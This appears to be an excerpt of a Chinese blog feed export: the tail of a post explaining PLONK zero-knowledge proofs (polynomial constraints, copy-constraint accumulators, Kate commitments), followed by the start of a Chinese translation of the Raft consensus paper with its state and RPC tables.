<p>​    下一步：许多形式相同的方程组可重新解释为多项式上的一个方程组。例如，假设我们有一个系统：<br>$$<br>2x_1-x_2+3x_3=8 \<br>x_1+4x_2-5x_3=5\<br>8x_1-x_2-x_3=-2<br>$$<br>​    我们用定值形式定义四个多项式：L(x)是在坐标 <code>(0, 1, 2)</code>处定值为<code>（2，1，8）</code>的阶数&lt; 3的多项式，在同样的坐标系下，M(x) 定值为<code> (-1, 4, -1)</code>， R(w)定值为<code>(3, -5, -1) </code>以及O(x)定值为<code>(8, 5, -2)</code>（用这种方法直接定义多项式是可以的，可以使用拉格朗日插值来转换成系数形式）。现在，考虑下面这个等式：<br>$$<br>L(x)*x_1 + M(x)*x_2 + R(x)*x_3 - O(x) = Z(x)H(x)<br>$$<br>​    在这里，<code>Z(x)</code>是<code>(x-0) * (x-1) * (x-2)</code>的简写，它是在定值域<code> (0, 1, 2)</code>上返回零的最小（非零）多项式。这个方程的解 (x1 = 1, x2 = 6, x3 = 4, H(x) = 0)也是原方程组的解，只是原方程组不需要H(x)。还要注意，在这种情况下，H(x)很方便为零，但在更复杂的情况下，H可能需要为非零。</p>
<p>所以现在我们知道，我们可以在少数数学对象（多项式）中表示一个大的约束集。但在我们上面建立的表示门线约束的方程中，x1, x2, x3变量在每个方程中是不同的。我们可以用同样的方法使变量本身成为多项式而不是常数来处理这个问题。所以我们得到：<br>$$<br>Q_L(x)a(x) + Q_R(x)b(x) + Q_O(x)c(x) + Q_M(x)a(x)b(x) + Q_C(x) = 0<br>$$<br>​    如前所述，每个<code>Q</code>多项式是由正在验证的程序生成的参数，<code>a</code>, <code>b</code>, <code>c</code>多项式是用户提供的输入。</p>
<h4 id="复制约束-Copy-constraints"><a href="#复制约束-Copy-constraints" class="headerlink" title="复制约束(Copy constraints)"></a>复制约束(Copy constraints)</h4><p>​    现在，让我们回到“连接”线上。到目前为止，我们所拥有的是一组关于不相交值的不相交方程，这些方程独立且易于满足：常数门可通过将值设置为常数来满足，加法和乘法门可通过将所有线设置为零来满足！为了使问题具有实际的挑战性（并实际表示原始电路中编码的问题），我们需要添加一个验证“复制约束”（如<code>a(5) = c(7), c(10) = c(12)</code>等约束）的等式，这需要一些巧妙的技巧。</p>
<p>​    我们的策略是设计一个“坐标对累加器”，一个多项式<code>p(x)</code> 的工作原理如下：首先，让<code>X(x)</code>和<code>Y(x)</code>两个多项式表示一组点的<code>x</code>和<code>y</code>坐标（例如表示集合<code>((0, -2), (1, 1), (2, 0), (3, 1))</code>, 你可设置X(x) = x以及Y(x) = x^3 - 5x^2 + 7x - 2)。我们的目标是让<code>p(x) </code>代表所有点，直到（但不包括）给定的位置，所以 p(0)从1开始，p(1)只代表第一个点，p(2)是第一个点和第二个点，诸如此类。我们将通过“随机”选择两个常数v1和v2，并使用约束<code>p(0) = 1</code>以及<code>p(x+1) = p(x) * (v1 + X(x) + v2 * Y(x))</code> 构造p(x)<code>，至少在域（0，1，2，3）内。例如，让v1=3和v2=2，我们得到：</code></p>
<p><img src="/2021/04/15/Plonk-5-%E6%9C%AC%E4%BA%BA%E5%AF%B9Plonk%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E6%80%BB%E7%BB%93/8.png"><br>$$<br>\qquad \qquad  X(x) \qquad 0  \qquad 1   \qquad  2   \qquad  3   \qquad  4 \<br>\qquad \qquad Y(x)  \quad -2   \qquad  1   \qquad  2   \qquad  1  \qquad \<br>v1+X(x)_V^2*Y(x) \quad -1 \qquad 6 \qquad 5 \qquad 8 \qquad \qquad \<br>\qquad \qquad \qquad p(x) \qquad 1 \quad -1 \quad -6 \quad -30 \ -240<br>$$<br>​    注意（除了第一列）每个p(x) 值，等于它左边的值乘以它左上面的值。</p>
<p>​    我们关心的结果是<code>p(4) = -240</code> 。现在，考虑这样的情况，我们设置X(x) = 2⁄3 x^3 - 4x^2 + 19⁄3 x（即，在坐标<code>（0，1，2，3）</code>处定值为<code>（0，3，2，1）</code>的多项式），而不是X(x) = x。</p>
<p>​    如果你运行同样的过程，你会发现你也会得到<code>p(4) = -240</code>。</p>
<p>​    这不是巧合（事实上，如果你随机从一个足够大的域中选择<code>v1</code>和<code>v2</code>，则几乎永远不会巧合地发生）。相反，这是因为 <code>Y(1) = Y(3)</code>，所以如果你“交换”点 (1, 1) 和（3，1）的X坐标，你就不会改变点的集合，并且因为累加器对集合进行编码（因为乘法不关心顺序），所以最后的值将是相同的。</p>
<p>​    现在，我们可以开始了解我们将用来证明复制约束的基本技术。首先，考虑一个简单的例子，我们只想证明在一组线中的复制约束（例如，我们想证明<code>a（1）=a（3）</code>）。我们将生成两个坐标累加器：一个是X(x) = x 和Y(x) = a(x)，另一个是Y(x) = a(x)，而<code>X’(x)</code>是对每个复制约束中的值的翻转排列（或重新排列）定值的多项式。在<code>a(1) = a(3)</code>的情况下，这意味着排列将开始于0 3 2 1 4…. 第一个累加器将压缩<code> ((0, a(0)), (1, a(1)), (2, a(2)), (3, a(3)), (4, a(4))</code>…，第二个压缩<code>（（0，A（0）），（3，A（1）），（2，A（2）），（1，A（3）），（4，A（4））</code>……只有当<code>a(1) = a(3)</code>时，两者才能给出相同的结果。</p>
<p>​    为了证明<code>a</code>，<code>b</code>和<code>c</code>之间的约束，我们使用了相同的过程，但是我们将所有三个多项式的点“累加”在一起。我们给a, b, c赋值一些X坐标（例如<code>a</code>为Xa(x) = x 即<code>0...n-1</code>, <code>b</code>为Xb(x) = n+x，即<code>n…2n-1</code>，<code>c </code>为Xc(x) = 2n+x，即<code>2n…3n-1</code>。为了证明在不同线集之间跳跃的复制约束，“替换”X坐标将是所有三个集合上的排列片段。例如，如果我们想用<code>n = 5</code> 证明<code>a（2）=b（4）</code>，那么X’a(x) 将有定值<code>0 1 9 3 4</code>，X’b(x)将有定值<code>5 6 7 8 2</code>（注意2和9翻转，其中9对应于b4线）。 然后，我们将不再像以前那样检查一次过程中的相等性（即检查p(4) = p’(4)），而是检查每侧三次不同运行的乘积：<br>$$<br>p_a(n)*p_b(n)*p_c(n) = p’_a(n)*p’_b(n)*p’_c(n)<br>$$<br>​    两边的三个 p(n)定值的乘积将<code>a</code>、<code>b</code>和<code>c</code>中的所有坐标对累加在一起，因此这允许我们像以前一样进行检查，除此之外，我们现在不仅可检查三组线A、B或C中一组内的位置之间的复制约束，还可以检查一组线与另一组线之间的复制约束（例如，在<code>a(2) = b(4)</code>中）。</p>
<h4 id="多项式承诺"><a href="#多项式承诺" class="headerlink" title="多项式承诺"></a>多项式承诺</h4><p>​    <a href="https://pdfs.semanticscholar.org/31eb/add7a0109a584cfbf94b3afaa3c117c78c91.pdf">多项式承诺</a>（polynomial commitment）是一个短对象，其“代表”一个多项式，并允许你验证该多项式的计算，而不需要实际包含多项式中的所有数据。也就是说，如果有人给你一个代表P(x)的承诺c，他们可以给你一个证明，然后说服你对于某个特定的z，P(z) 值是多少。还有一个进一步的数学结果表明，在一个足够大的域上，如果关于在随机z上定值的多项式的某些类型的方程（在z已知之前选择）是真的，那么这些相同的方程对整个多项式也是真的。例如，如果<code>P(z) * Q(z) + R(z) = S(z) + 5</code>，那么我们知道<code>P(x) * Q(x) + R(x) = S(x) + 5</code>通常是极有可能的。使用这样的多项式承诺，我们可以很容易地检查上面所有的多项式方程。作出承诺，使用它们作为输入生成<code>z</code>，证明在z上每个多项式的定值是什么，然后用这些定值来运行方程，而不是原来的多项式。那这些承诺是如何运作的呢？</p>
<p>​    有两部分：对多项式<code>P(x) -&gt; c</code>的承诺，以及在某个<code>z</code>处对值<code>P(z)</code>的opening。而要作出承诺，有很多技术，一个例子是<a href="https://vitalik.ca/general/2017/11/22/starks_part_2.html">FRI</a>，另一个是Kate承诺，我将在下面描述。为了证明一个 opening，有一个简单的通用“减除”技巧：为了证明<code>P(z) = a</code>，你要证明<br>$$<br>\frac{P(x)-a}{x-z}<br>$$<br>​    也是一个多项式（使用另一个多项式承诺）。这是因为如果商是一个多项式（即它不是分数），那么<code>x - z</code>是<code>P(x) - a</code>的一个因子，所以<code>(P(x) - a)(z) = 0</code>，所以<code> P(z) = a</code>。用一些多项式试试，<a href="https://www.wolframalpha.com/input/?i=factor+((x%5E3+++2*x%5E2+++5)+-+293)+/+(x+-+6)">比如P(x) = x^3 + 2*x^2+5 (z=6，a=293)，然后试试 (z = 6, a = 292)，看看它是如何失败的</a>。</p>
<p>​    另请注意一个一般优化：为了同时证明多个多项式的多个opening，在提交输出后，对多项式和输出的随机线性组合执行减除技巧。</p>
<p>​    那么，承诺本身是如何运作的呢？幸运的是，Kate 承诺要比FRI简单得多。可信设置过程生成一组椭圆曲线点G, G * s, G * s^2 …. G * s^n，以及G2 * s，其中G 和G2是两个椭圆曲线组的生成器，而s则是一个一旦程序完成就会被遗忘的秘密（注意，这个设置有多个版本，它是安全的，只要至少有一个参与者忘记了他们分享的秘密）。这些点会被公布，并被认为是方案的“证明关键”，任何需要作出多项式承诺的人都需要使用这些点。通过将证明密钥中的前d+1个点中的每一点乘以多项式中的相应系数，并将结果相加，对d次多项式作出承诺。</p>
<p>​    注意，这提供了在<code>s</code>处的多项式的“定值”，而不知道<code>s</code>。例如，x^3 + 2x^2+5 将由(G * s^3) + 2 * (G * s^2) + 5 * G表示。我们可以用符号<code>[P]</code>来表示用这种方式（即<code>G * P(s)</code>）编码的P。在做减除技巧时，可以使用<a href="https://medium.com/@VitalikButerin/exploring-elliptic-curve-pairings-c73c1864e627">椭圆曲线对</a>来证明这两个多项式实际上满足关系：检查<code>e([P] - G * a, G2) = e([Q], [x] - G2 * z)</code>是否作为检查<code>P(x) - a = Q(x) * (x - z)</code>的代理。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    最后，再讨论一下这个方案，给定一个程序P，将其转换为一个电路，并生成一组如下所示的方程：<br>$$<br>({Q_L}_i)a_i + ({Q_R}_i)b_i + ({Q_O}_i)c_i + ({Q_M}_i)a_ib_i + {Q_C}_i = 0<br>$$<br>​    然后将这组方程转换为一个多项式方程：<br>$$<br>Q_L(x)a(x) + Q_R(x)b(x) + Q_O(x)c(x) + Q_M(x)a(x)b(x) + Q_C(x) = 0<br>$$<br>​    还可以从回路中生成复制约束的列表。从这些复制约束生成表示排列线指数的三个多项式：σa(x), σb(x), σc(x)。要生成证明，需要计算所有线的值，并将其转换为三个多项式：a(x), b(x), c(x)。作为置换检查参数的一部分，还可以计算六个“坐标对累加器”多项式。最后计算辅因子Hi(x)。</p>
<p>​    多项式之间有一组方程需要检查，可以通过对多项式作出承诺，在某些随机z处打开它们（同时证明这些opening是正确的），并在这些求值结果上运行方程，而不是在原始多项式上运行方程来完成这项工作。证明本身只是一些承诺和opening，可以用几个方程式来检查。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Raft论文翻译</title>
    <url>/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/</url>
    <content><![CDATA[<p>Raft 算法是可以用来替代 Paxos 算法的分布式一致性算法，而且 raft 算法比 Paxos 算法更易懂且更容易实现。本篇博客为著名的 RAFT 一致性算法论文的中文翻译，论文名为《<a href="https://ramcloud.atlassian.net/wiki/download/attachments/6586375/raft.pdf">In search of an Understandable Consensus Algorithm (Extended Version)</a>》(寻找一种易于理解的一致性算法)。</p>
<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>Raft 是用来管理复制日志（replicated log）的一致性协议。它跟 multi-Paxos 作用相同，效率也相当，但是它的组织结构跟 Paxos 不同。这使得 Raft 比 Paxos 更容易理解并且更容易在工程实践中实现。为了使 Raft 协议更易懂，Raft将一致性的关键元素分开，如 leader 选举、日志复制和安全性，并且它实施更强的一致性以减少必须考虑的状态的数量。用户研究的结果表明，Raft 比 Paxos 更容易学习。 Raft 还包括一个用于变更集群成员的新机制，它使用重叠的大多数（overlapping majorities）来保证安全性。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>一致性算法允许多台机器作为一个集群协同工作，并且在其中的某几台机器出故障时集群仍然能正常工作。 正因为如此，一致性算法在建立可靠的大规模软件系统方面发挥了关键作用。 在过去十年中，Paxos [15,16] 主导了关于一致性算法的讨论：大多数一致性的实现都是基于 Paxos 或受其影响，Paxos 已成为用于教授学生一致性相关知识的主要工具。</p>
<p>不幸的是，Paxos 实在是太难以理解，尽管许多人一直在努力尝试使其更易懂。 此外，其架构需要复杂的改变来支持实际系统。 结果是，系统开发者和学生都在与 Paxos 斗争。</p>
<p>在我们自己与 Paxos 斗争之后，我们开始着手寻找一个新的一致性算法，可以为系统开发和教学提供更好的基础。 我们的方法是不寻常的，因为我们的主要目标是可理解性：我们可以为实际系统定义一个一致性算法，并以比 Paxos 更容易学习的方式描述它吗？在该算法的设计过程中，重要的不仅是如何让该算法起作用，还有清晰地知道该算法为什么会起作用。</p>
<p>这项工作的结果是一个称为 Raft 的一致性算法。 在设计 Raft 时，我们使用了特定的技术来提高可理解性，包括分解（Raft 分离 leader 选举，日志复制和安全）和状态空间减少（相对于 Paxos ，Raft 减少了不确定性程度和服务器之间彼此不一致的方式 ）。 一项针对两个大学的 43 名学生的用户研究表明，Raft 比 Paxos 更容易理解：在学习两种算法后，其中 33 名学生能够更好地回答关于 Raft 的问题。</p>
<p>Raft 在许多方面类似于现有的一致性算法（尤其是 <a href="http://www.pmg.csail.mit.edu/papers/vr.pdf">Oki 和 Liskov 的 Viewstamped Replication [29,22]</a>），但它有几个新特性：</p>
<ul>
<li>Strong leader：在 Raft 中，日志条目（log entries）只从 leader 流向其他服务器。 这简化了复制日志的管理，使得 raft 更容易理解。</li>
<li>Leader 选举：Raft 使用随机计时器进行 leader 选举。这只需在任何一致性算法都需要的心跳（heartbeats）上增加少量机制，同时能够简单快速地解决冲突。</li>
<li>成员变更：Raft 使用了一种新的联合一致性方法，其中两个不同配置的大多数在过渡期间重叠。 这允许集群在配置更改期间继续正常运行。</li>
</ul>
<p>我们认为，Raft 优于 Paxos 和其他一致性算法，不仅在教学方面，在工程实现方面也是。 它比其他算法更简单且更易于理解; 它被描述得十分详细足以满足实际系统的需要; 它有多个开源实现，并被多家公司使用; 它的安全性已被正式规定和验证; 它的效率与其他算法相当。</p>
<p>本文的剩余部分介绍了复制状态机问题（第 2 节），讨论了 Paxos 的优点和缺点（第3节），描述了我们实现易理解性的方法（第 4 节），提出了Raft一致性算法（第 5-8 节），评估Raft（第 9 节），并讨论了相关工作（第 10 节）。</p>
<h3 id="复制状态机（Replicated-state-machines）"><a href="#复制状态机（Replicated-state-machines）" class="headerlink" title="复制状态机（Replicated state machines）"></a>复制状态机（Replicated state machines）</h3><p>一致性算法是在<a href="https://www.cs.cornell.edu/fbs/publications/SMSurvey.pdf">复制状态机[37]</a>的背景下产生的。 在这种方法中，一组服务器上的状态机计算相同状态的相同副本，并且即使某些服务器宕机，也可以继续运行。</p>
<p>复制状态机用于解决分布式系统中的各种容错问题。 例如，具有单个 leader 的大规模系统，如 GFS [8]，HDFS [38] 和 RAMCloud [33] ，通常使用单独的复制状态机来进行 leader 选举和存储 leader 崩溃后重新选举需要的配置信息。Chubby [2] 和 ZooKeeper [11] 都是复制状态机。</p>
<p>复制状态机通常使用复制日志实现，如图1所示。每个服务器存储一个包含一系列命令的日志，其状态机按顺序执行日志中的命令。 每个日志中命令都相同并且顺序也一样，因此每个状态机处理相同的命令序列。 这样就能得到相同的状态和相同的输出序列。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/1.png"><br>图1</p>
<p>一致性算法的工作就是保证复制日志的一致性。 每台服务器上的一致性模块接收来自客户端的命令，并将它们添加到其日志中。 它与其他服务器上的一致性模块通信，以确保每个日志最终以相同的顺序包含相同的命令，即使有一些服务器失败。 一旦命令被正确复制，每个服务器上的状态机按日志顺序处理它们，并将输出返回给客户端。 这样就形成了高可用的复制状态机。</p>
<p>实际系统中的一致性算法通常具有以下属性：</p>
<ul>
<li><p>它们确保在所有非拜占庭条件下（包括网络延迟，分区和数据包丢失，重复和乱序）的安全性（不会返回不正确的结果）。</p>
</li>
<li><p>只要任何大多数（过半）服务器都可以运行，并且可以相互通信和与客户通信，一致性算法就可用。 因此，五台服务器的典型集群可以容忍任何两台服务器的故障。 假设服务器突然宕机; 它们可以稍后从状态恢复并重新加入群集。</p>
</li>
<li><p>它们不依赖于时序来确保日志的一致性：错误的时钟和极端消息延迟可能在最坏的情况下导致可用性问题。</p>
</li>
<li><p>在通常情况下，只要集群的大部分（过半服务器）已经响应了单轮远程过程调用，命令就可以完成; 少数（一半以下）慢服务器不需要影响整个系统性能。</p>
</li>
</ul>
<h3 id="Paxos-存在的问题"><a href="#Paxos-存在的问题" class="headerlink" title="Paxos 存在的问题"></a>Paxos 存在的问题</h3><p>在过去十年里，Leslie Lamport 的 Paxos 协议[15]几乎成为一致性的同义词：它是课堂上教授最多的一致性协议，并且大多数一致性的实现也以它为起点。 Paxos 首先定义了能够在单个决策（例如单个复制日志条目）上达成一致的协议。 我们将这个子集称为 single-decree Paxos。 然后 Paxos 组合该协议的多个实例以促进一系列决策，例如日志（multi-Paxos）。 Paxos能够确保安全性和活性，并且支持集群成员的变更。它的正确性已被证明，并且在正常情况下是高效的。</p>
<p>不幸的是，Paxos 有两个显著的缺点。 第一个缺点是 Paxos 非常难以理解。 Paxos 的描述晦涩难懂，臭名昭著（译者注：《The Part-time Parliament》比较晦涩难懂，但是《Paxos Made Simple》就比较容易理解）; 很少有人成功地理解它，即使能理解也必须付出巨大的努力。 因此，已有几个尝试以更简单的方式来描述 Paxos [16,20,21] 。 这些描述集中在 single-degree Paxos ，但它们仍然具有挑战性。 在对 NSDI 2012 参会者的非正式调查中，我们发现很少有人喜欢 Paxos ，即使是经验丰富的研究人员。 我们自己也跟 Paxos 进行了艰苦的斗争; 我们也无法完全理解整个协议，直到阅读了几个更简单的描述和自己设计替代 Paxos 的协议，整个过程花了将近一年。</p>
<p>Paxos 晦涩难懂的原因是作者选择了single-degree Paxos作为基础。Single-decree Paxos 分成两个阶段，这两个阶段没有简单直观的说明，并且不能被单独理解。因此，很难理解为什么该算法能起作用。Multi-Paxos 的合成规则又增加了许多复杂性。我们相信，对多个决定（日志而不是单个日志条目）达成一致的总体问题可以用其他更直接和更明显的方式进行分解。</p>
<p>Paxos的第二个问题是它不能为构建实际的实现提供良好的基础。 一个原因是没有针对 multi-Paxos 的广泛同意的算法。 Lamport的描述主要是关于 single-decree Paxos; 他描述了 multi-Paxos 的可能方法，但缺少许多细节。 已经有几个尝试来具体化和优化 Paxos ，例如[26]，[39]和[13]，但这些彼此各不相同并且跟 Lamport 描述的也不同。 像Chubby [4] 这样的系统已经实现了类 Paxos（Paxos-like）算法，但大多数情况下，它们的细节并没有公布。</p>
<p>此外，Paxos 的架构对于构建实际系统来说是一个糟糕的设计，这是 single-decree 分解的另一个结果。 例如，独立地选择日志条目集合，然后再将它们合并到顺序日志中几乎没有任何好处，这只会增加复杂性。 围绕日志设计系统是更简单和有效的方法，新日志条目按照约束顺序地添加到日志中。 Paxos 的做法适用于只需要做一次决策的情况，如果需要做一系列决策，更简单和快速的方法是先选择一个 leader ，然后让该 leader 协调这些决策。</p>
<p>因此，实际的系统跟 Paxos 相差很大。几乎所有的实现都是从 Paxos 开始，然后发现很多实现上的难题，接着就开发了一种和 Paxos 完全不一样的架构。这样既费时又容易出错，而且 Paxos 本身晦涩难懂使得该问题更加严重。Paxos 的公式可能可以很好地证明它的正确性，但是现实的系统和 Paxos 差别是如此之大，以至于这些证明并没有什么太大的价值。下面来自 Chubby 作者的评论非常典型：</p>
<blockquote>
<p>在Paxos算法描述和实现现实系统中间有着巨大的鸿沟。最终的系统往往建立在一个还未被证明的协议之上。</p>
</blockquote>
<p>由于以上问题，我们得出的结论是 Paxos 算法没有为系统实践和教学提供一个良好的基础。考虑到一致性问题在大规模软件系统中的重要性，我们决定尝试设计一个能够替代 Paxos 并且具有更好特性的一致性算法。Raft算法就是这次实验的结果。</p>
<h3 id="为可理解性而设计"><a href="#为可理解性而设计" class="headerlink" title="为可理解性而设计"></a>为可理解性而设计</h3><p>在设计 Raft 算法过程中我们有几个目标：它必须提供一个完整的实际的系统实现基础，这样才能大大减少开发者的工作；它必须在任何情况下都是安全的并且在典型的应用条件下是可用的；并且在正常情况下是高效的。但是我们最重要的目标也是最大的挑战是可理解性。它必须保证能够被大多数人容易地理解。另外，它必须能够让人形成直观的认识，这样系统的构建者才能够在现实中进行扩展。</p>
<p>在设计 Raft 算法的时候，很多情况下我们需要在多个备选方案中进行选择。在这种情况下，我们基于可理解性来评估备选方案：解释各个备选方案的难道有多大（例如，Raft 的状态空间有多复杂，是否有微妙的含义）？对于一个读者而言，完全理解这个方案和含义是否容易？</p>
<p>我们意识到这样的分析具有高度的主观性；但是我们使用了两种通用的技术来解决这个问题。第一个技术就是众所周知的问题分解：只要有可能，我们就将问题分解成几个相对独立的，可被解决的、可解释的和可理解的子问题。例如，Raft 算法被我们分成 <strong>leader 选举，日志复制，安全性和成员变更</strong>几个部分。</p>
<p>我们使用的第二个方法是通过减少状态的数量来简化状态空间，使得系统更加连贯并且尽可能消除不确定性。特别的，所有的日志是不允许有空洞的，并且 Raft 限制了使日志之间不一致的方式。尽管在大多数情况下我们都试图去消除不确定性，但是在某些情况下不确定性可以提高可理解性。特别是，随机化方法虽然引入了不确定性，但是他们往往能够通过使用相近的方法处理可能的选择来减少状态空间。我们使用随机化来简化 Raft 中的 leader 选举算法。</p>
<h3 id="Raft-一致性算法"><a href="#Raft-一致性算法" class="headerlink" title="Raft 一致性算法"></a>Raft 一致性算法</h3><p>Raft 是一种用来管理第 2 节中描述的复制日志的算法。图 2 是该算法的浓缩，可用作参考，图 3 列举了该算法的一些关键特性。图中的这些内容将在剩下的章节中逐一介绍。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/2.png"><br>图2</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/3.png"><br>图3</p>
<p><strong>状态</strong> ：</p>
<p>在所有服务器上持久存在的：（在响应远程过程调用 RPC 之前稳定存储的）</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>currentTerm</td>
<td>服务器最后知道的任期号（从0开始递增）</td>
</tr>
<tr>
<td>votedFor</td>
<td>在当前任期内收到选票的 Candidate  id（如果没有就为 null）</td>
</tr>
<tr>
<td>log[]</td>
<td>日志条目；每个条目包含状态机的要执行命令和从 Leader 处收到时的任期号</td>
</tr>
</tbody></table>
<p>在所有服务器上不稳定存在的：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>commitIndex</td>
<td>已知的被提交的最大日志条目的索引值（从0开始递增）</td>
</tr>
<tr>
<td>lastApplied</td>
<td>被状态机执行的最大日志条目的索引值（从0开始递增）</td>
</tr>
</tbody></table>
<p>在 Leader 服务器上不稳定存在的：（在选举之后初始化的）</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>nextIndex[]</td>
<td>对于每一个服务器，记录需要发给它的下一个日志条目的索引（初始化为 Leader 上一条日志的索引值+1）</td>
</tr>
<tr>
<td>matchIndex[]</td>
<td>对于每一个服务器，记录已经复制到该服务器的日志的最高索引值（从0开始递增）</td>
</tr>
</tbody></table>
<p>表-2-i</p>
<p><strong>附加日志远程过程调用 （AppendEntries RPC）</strong></p>
<p>由 Leader 来调用复制日志（5.3节）；也会用作heartbeat。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>term</td>
<td>Leader 的任期号</td>
</tr>
<tr>
<td>leaderId</td>
<td>Leader 的 id，为了其他服务器能重定向到客户端</td>
</tr>
<tr>
<td>prevLogIndex</td>
<td>最新日志之前的日志的索引值</td>
</tr>
<tr>
<td>prevLogTerm</td>
<td>最新日志之前的日志的 Leader 任期号</td>
</tr>
<tr>
<td>entries[]</td>
<td>将要存储的日志条目（表示 heartbeat 时为空，有时会为了效率发送超过一条）</td>
</tr>
<tr>
<td>leaderCommit</td>
<td>Leader 提交的日志条目索引值</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>返回值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>term</td>
<td>当前的任期号，用于 Leader 更新自己的任期号</td>
</tr>
<tr>
<td>success</td>
<td>如果其它服务器包含能够匹配上 prevLogIndex 和 prevLogTerm 的日志时为真</td>
</tr>
</tbody></table>
<p><strong>接受者需要实现：</strong></p>
<ol>
<li>如果 term &lt; currentTerm返回 false（5.1节）</li>
<li>如果在prevLogIndex处的日志的任期号与prevLogTerm不匹配时，返回 false（5.3节）</li>
<li>如果一条已经存在的日志与新的冲突（index 相同但是任期号 term 不同），则删除已经存在的日志和它之后所有的日志（5.3节）</li>
<li>添加任何在已有的日志中不存在的条目</li>
<li>如果leaderCommit &gt; commitIndex，将commitIndex设置为leaderCommit和最新日志条目索引号中较小的一个</li>
</ol>
<p>表-2-ii</p>
<p><strong>投票请求 RPC（RequestVote RPC</strong>）</p>
<p>由 Candidate 发起收集选票（5.2节）</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>term</td>
<td>Candidate 的任期号</td>
</tr>
<tr>
<td>candidateId</td>
<td>请求投票的 Candidate  id</td>
</tr>
<tr>
<td>lastLogIndex</td>
<td>Candidate 最新日志条目的索引值</td>
</tr>
<tr>
<td>lastLogTerm</td>
<td>Candidate 最新日志条目对应的任期号</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>返回值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>term</td>
<td>当前的任期号，用于 Candidate 更新自己的任期号</td>
</tr>
<tr>
<td>voteGranted</td>
<td>如果 Candidate 收到选票为 true</td>
</tr>
</tbody></table>
<p><strong>接受者需要实现：</strong></p>
<ol>
<li>如果term &lt; currentTerm返回 false（5.1节）</li>
<li>如果votedFor为空或者与candidateId相同，并且 Candidate 的日志和自己的日志一样新，则给该 Candidate 投票（5.2节 和 5.4节）</li>
</ol>
<p>表-2-iii</p>
<p><strong>服务器需要遵守的规则：</strong></p>
<ul>
<li><p><strong>All Server：</strong></p>
<ul>
<li>如果commitIndex &gt; lastApplied，lastApplied自增，将log[lastApplied]应用到状态机（5.3节）</li>
<li>如果 RPC 的请求或者响应中包含一个 term T 大于 currentTerm，则currentTerm赋值为 T，并切换状态为 Follower （Follower）（5.1节）</li>
</ul>
</li>
<li><p><strong>Followers: 5.2节</strong></p>
<ul>
<li>响应来自 Candidate 和 Leader 的 RPC</li>
<li>如果在超过选取 Leader 时间之前没有收到来自当前 Leader 的AppendEntries RPC或者没有收到 Candidate 的投票请求，则自己转换状态为 Candidate </li>
</ul>
</li>
<li><p><strong>Candidate：5.2节</strong></p>
<ul>
<li>转变为选举人之后开始选举：<ul>
<li>currentTerm自增</li>
<li>给自己投票</li>
<li>重置选举计时器</li>
<li>向其他服务器发送RequestVote RPC</li>
</ul>
</li>
<li>如果收到了来自大多数服务器的投票：成为 Leader </li>
<li>如果收到了来自新 Leader 的AppendEntries RPC（heartbeat）：转换状态为 Follower </li>
<li>如果选举超时：开始新一轮的选举</li>
</ul>
</li>
<li><p><strong>Leader：</strong></p>
<ul>
<li>一旦成为 Leader ：向其他所有服务器发送空的AppendEntries RPC（heartbeat）;在空闲时间重复发送以防止选举超时（5.2节）</li>
<li>如果收到来自客户端的请求：向本地日志增加条目，在该条目应用到状态机后响应客户端（5.3节）</li>
<li>对于一个 Follower 来说，如果上一次收到的日志索引大于将要收到的日志索引（nextIndex）：通过AppendEntries RPC将 nextIndex 之后的所有日志条目发送出去</li>
<li>如果发送成功：将该 Follower 的 nextIndex和matchIndex更新</li>
<li>如果由于日志不一致导致AppendEntries RPC失败：nextIndex递减并且重新发送（5.3节）</li>
<li>如果存在一个满足N &gt; commitIndex和matchIndex[i] &gt;= N并且log[N].term == currentTerm的 N，则将commitIndex赋值为 N</li>
</ul>
</li>
</ul>
<p>表-2-iv</p>
<p>表-2：Raft 一致性算法的总结（不包括成员变化 membership changes 和日志压缩 log compaction）</p>
<table>
<thead>
<tr>
<th>性质</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>选举安全原则（Election Safety）</td>
<td>一个任期（term）内最多允许有一个 Leader 被选上（5.2节）</td>
</tr>
<tr>
<td>Leader 只增加原则（Leader Append-Only）</td>
<td>Leader 永远不会覆盖或者删除自己的日志，它只会增加条目</td>
</tr>
<tr>
<td>日志匹配原则（Log Matching）</td>
<td>如果两个日志在相同的索引位置上的日志条目的任期号相同，那么我们就认为这个日志从头到这个索引位置之间的条目完全相同（5.3 节）</td>
</tr>
<tr>
<td>Leader 完全原则（Leader Completeness)</td>
<td>如果一个日志条目在一个给定任期内被提交，那么这个条目一定会出现在所有任期号更大的 Leader 中</td>
</tr>
<tr>
<td>状态机安全原则（State Machine Safety）</td>
<td>如果一个服务器已经将给定索引位置的日志条目应用到状态机中，则所有其他服务器不会在该索引位置应用不同的条目（5.4.3节）</td>
</tr>
<tr>
<td>表-3：Raft 算法保证这些特性任何时刻都成立</td>
<td></td>
</tr>
</tbody></table>
